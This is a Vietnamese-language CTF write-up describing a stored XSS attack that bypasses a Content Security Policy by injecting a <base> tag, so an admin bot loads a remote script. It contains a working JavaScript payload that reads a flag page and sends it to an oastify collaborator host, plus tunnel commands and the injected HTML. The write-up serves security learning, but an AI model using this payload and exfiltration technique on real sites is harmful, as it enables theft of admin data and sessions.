#  CTF WRITEUP: STORED XSS & CSP BYPASS BẰNG THẺ `<base>`

##  I. Phân tích lỗ hổng & Kịch bản tấn công

Bài lab yêu cầu lợi dụng tính năng **Admin Review** (một Bot Admin sẽ tự động duyệt các nội dung phản hồi do người dùng gửi lên) để chạy mã độc JavaScript (Stored XSS). Mục tiêu là đọc nội dung file `/xss-two-flag` và gửi cờ (flag) ra ngoài.

Thông qua các gợi ý của hệ thống, ta xác định được 2 điểm yếu chí mạng trong **Content Security Policy (CSP)** của trang web:

**1. Điểm yếu `connect-src *`:**
Trình duyệt được phép gửi request (fetch, XHR) ra **bất kỳ domain nào**. Điều này có nghĩa là một khi ta thực thi được mã JS, ta có thể thoải mái tuồn cờ ra ngoài (Data Exfiltration) mà không lo bị CSP chặn lại.

**2. Điểm yếu thiếu `base-uri` (Lỗ hổng cốt lõi):**
Việc CSP không giới hạn `base-uri` cho phép kẻ tấn công chèn thẻ HTML `<base href="...">`. Thẻ này có chức năng thay đổi "gốc" (origin) của **tất cả các đường dẫn tương đối** (relative paths) đang có trên trang web. 

**Kịch bản:** Nếu trang web của Admin load một script bằng đường dẫn tương đối (ví dụ: `<script src="test.js"></script>`), ta chỉ cần chèn `<base href="https://attacker.com/">`. Ngay lập tức, trình duyệt của Admin sẽ bị đánh lừa và đi tải script từ `https://attacker.com/test.js` thay vì máy chủ gốc.

![image](https://github.com/user-attachments/assets/183d99ea-8d1f-4fce-a267-1d6093113ca7)

---

##  II. Chuẩn bị Vũ khí (Weaponization)

Để khai thác, ta cần chuẩn bị một file `test.js` độc hại và một máy chủ public để Admin Bot có thể tải file này về.

### 1. Tạo file mã độc `test.js`
Viết một đoạn script để đọc cờ bằng quyền của Admin và gửi về Burp Collaborator (hoặc Oastify). Lưu ý: Dùng `location.origin` để ép trình duyệt gọi đúng về máy chủ nội bộ chứa cờ, tránh bị ảnh hưởng ngược bởi chính thẻ `<base>` của ta.

```javascript
// File: test.js
fetch(location.origin + '/xss-two-flag')
  .then(response => response.text())
  .then(flag => {
    // Mã hóa flag bằng Base64 (btoa) để tránh lỗi URL encoding
    let oastifyUrl = '[https://nsj3spjsyf55h476ew3j0fvh58bzz1nq.oastify.com](https://nsj3spjsyf55h476ew3j0fvh58bzz1nq.oastify.com)'; 
    let url = oastifyUrl + '/?flag=' + btoa(flag);
    fetch(url);
  })
  .catch(err => console.error(err));
```

### 2. Dựng Web Server và Public qua Cloudflare Tunnel
Tại thư mục chứa file `test.js` trên máy cá nhân, ta mở Command Prompt và khởi tạo web server port 8000 bằng Python:
```bash
python -m http.server 8000
```
![image](https://github.com/user-attachments/assets/635cc1e6-9985-4b2d-bba4-fd440af2b22c)

Tiếp theo, mở một cửa sổ Command Prompt khác, dùng `cloudflared` để map port 8000 nội bộ ra Internet, tạo một đường dẫn HTTPS public:
```bash
cloudflared.exe tunnel --url http://localhost:8000
```
*(Giả sử Cloudflare cấp cho ta domain: `https://functional-cake-not-fields.trycloudflare.com`)*

![image](https://github.com/user-attachments/assets/3d25f823-d188-4c6b-8989-1e5fcde8a912)

---

##  III. Thực thi & Đánh cắp Flag (Exploit & Exfiltration)

Truy cập vào form gửi phản hồi (Submit Feedback) của bài lab, ta nhập payload chèn thẻ `<base>` trỏ về domain Cloudflare vừa tạo:

```html
<base href="https://functional-cake-not-fields.trycloudflare.com/">
```

![image](https://github.com/user-attachments/assets/7d018ef1-e6bd-4011-9368-0ebbb1f25d0b)

**Chuyện gì sẽ xảy ra tiếp theo?**
1. Admin Bot truy cập vào trang để duyệt phản hồi của ta.
2. Thẻ `<base>` của ta được render.
3. Trang web của Admin có sẵn một dòng code gọi `<script src="test.js"></script>`.
4. Trình duyệt của Admin tự động nối chuỗi và tải mã độc từ: `https://functional-cake-not-fields.trycloudflare.com/test.js`.
5. Mã độc thực thi, lấy cờ và gửi thẳng về Burp Collaborator.

Kiểm tra trên Collaborator, ta nhận được một request chứa tham số Base64. Sau khi decode, ta thu được kết quả:

** FLAG THU ĐƯỢC:**
```text
CTF{b453d-4nd-c0nfU53d}
```
